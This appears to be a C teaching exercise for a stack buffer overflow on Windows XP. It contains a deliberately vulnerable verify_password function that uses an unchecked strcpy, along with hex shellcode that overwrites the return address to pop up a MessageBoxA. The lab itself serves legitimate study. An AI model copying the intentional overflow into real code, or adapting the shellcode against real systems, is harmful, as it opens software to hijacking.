/* Description: single stack overflow
 * [exp]
 *		shellcode.txt -- shellcode
 *		Buffer overflow to Change the function return value (verify_password)
 *
 * [environment]
 *		windows xp sp3
 *		vc++6.0
 *
 * [shellcode]
 *	33 DB 53 68 6D 6F 74 65 68 72 61 69 6E 8B C4 53
 *	50 50 53 B8 EA 07 D5 77 FF D0 90 90 90 90 90 90 
 *	90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 
 *	90 90 90 90 7C FB 12 00
 *  (The above code is written to shellcode.txt)
*/

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <windows.h>

#define PASSWORD "1234567"

int verify_password(char *password)
{
	int flag;
	char buffer[44]; // address: 0x0012FB7C
	flag = strcmp(password, PASSWORD);
	strcpy(buffer, password); // over flowed here!
	return flag;
}

int main()
{
	int valid_flag = 0;
	char password[1024];
	FILE *fp;
	LoadLibrary("user32.dll"); // prepare for MessageBoxA:0x77D507EA
	if (!(fp = fopen("shellcode.txt", "rw+")))
	{
		exit(1);
	}
	fscanf(fp, "%s", password);
	valid_flag = verify_password(password);
	if (valid_flag)
	{
		printf("incorrect password!\n\n");
	} else {
		printf("Congratulation! You have passed the verification!\n");
	}
	fclose(fp);

	return 0;
}
